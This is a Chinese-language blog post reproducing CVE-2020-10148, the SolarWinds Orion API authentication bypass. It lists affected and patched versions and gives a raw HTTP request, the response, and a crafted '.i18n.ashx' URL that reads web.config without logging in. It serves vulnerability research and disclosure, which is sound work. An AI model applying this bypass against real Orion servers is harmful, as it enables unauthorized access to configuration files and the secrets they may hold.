![1610450922_5ffd87ea58f2919323a5e.png!small](https://image.3001.net/images/20210112/1610450922_5ffd87ea58f2919323a5e.png!small)

SolarWinds Orion API 远程代码执行漏洞

（CVE-2020-10148）

## 一、漏洞概况

SolarWinds Orion API 嵌入在 Orion Core 中，被用于与所有 SolarWinds Orion Platform
产品进行接口。通过在URI请求的Request.PathInfo 部分中包含特定参数，可以绕过 API 身份验证，这可能允许攻击者执行未经身份验证的 API
命令。如果攻击者将WebResource.adx，scriptResource.adx，i18n.ashx 或 Skipi18n 的 PathInfo
参数附加到对 SolarWinds Orion 服务器的请求，SolarWinds 可能会设置 SkipAuthorization
标志，该标志可能允许处理API请求无需身份验证。

攻击者可利用该漏洞远程执行任意代码，有专业黑客组织利用该漏洞投递代号为'SUPERNOVA'的恶意程序。

## 二、漏洞影响范围

影响版本：

SolarWinds Orion 2020.2.1 HF 2 及 2019.4 HF 6之前的版本

安全版本：

SolarWinds Orion 2019.4 HF 6（2020年12月14日发布）

SolarWinds Orion 2020.2.1 HF 2（发布于2020年12月15日）

SolarWinds Orion 2019.2 SUPERNOVA补丁（2020年12月23日发布）

SolarWinds Orion 2018.4 SUPERNOVA补丁（2020年12月23日发布）

SolarWinds Orion 2018.2 SUPERNOVA补丁（2020年12月23日发布）

## 三、漏洞复现

访问/Orion/invalid.aspx.js 路径，截取请求头中Location中data获取

Location:/Orion/invalid.aspx.js.i18n.ashx?l=en-us&v=43005.14.L

![1610450923_5ffd87eb74ade2ab07a25.png!small](https://image.3001.net/images/20210112/1610450923_5ffd87eb74ade2ab07a25.png!small)

GET/Orion/invalid.aspx.jsHTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0
(Macintosh; Intel Mac OS X 10.15; rv:84.0) Gecko/20100101 Firefox/84.0Accept:
text/css,*/*;q=0.1Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeReferer:
http://127.0.0.1/Orion/Login.aspx?ReturnUrl=%2fCookie:
ASP.NET_SessionId=p5yxzzumyllsfprttbkexo4u; TestCookieSupport=Supported;
Orion_IsSessionExp=TRUE

response

HTTP/1.1404Not FoundCache-Control: no-cachePragma: no-cacheExpires:
-1Location: /Orion/invalid.aspx.js.i18n.ashx?l=en-us&v=43005.14.LServer:
Microsoft-IIS/10.0X-Powered-By: ASP.NETX-Same-Domain: 1X-Content-Type-Options:
nosniffX-Frame-Options: SAMEORIGINX-XSS-Protection: 1; mode=blockDate: Wed, 30
Dec 2020 01:55:43 GMTConnection: closeContent-Length: 0

将 .i18n.ashx?l=en-US&v=43005.14.L携带到下个访问路径，从而绕过身份认证。这里访问的是 web.config文件。

![1610450924_5ffd87ec0b35ec231e82d.png!small](https://image.3001.net/images/20210112/1610450924_5ffd87ec0b35ec231e82d.png!small)

直接访问也行：

http://127.0.0.1/web.config.i18n.ashx?l=en-us&v=43005.14.L

![1610450924_5ffd87eca79cc647b4ccd.png!small](https://image.3001.net/images/20210112/1610450924_5ffd87eca79cc647b4ccd.png!small)

## 参考

https://nosec.org/home/detail/4630.html

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![1610450925_5ffd87eda708d20a72805.jpg!small](https://image.3001.net/images/20210112/1610450925_5ffd87eda708d20a72805.jpg!small)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF主页：https://www.freebuf.com/author/thelostworld?type=article

![1610450926_5ffd87ee048cf684edb39.png!small](https://image.3001.net/images/20210112/1610450926_5ffd87ee048cf684edb39.png!small)

欢迎添加本公众号作者微信交流，添加时备注一下“公众号”

![1610450926_5ffd87ee6efc36c7a179b.png!small](https://image.3001.net/images/20210112/1610450926_5ffd87ee6efc36c7a179b.png!small)

  

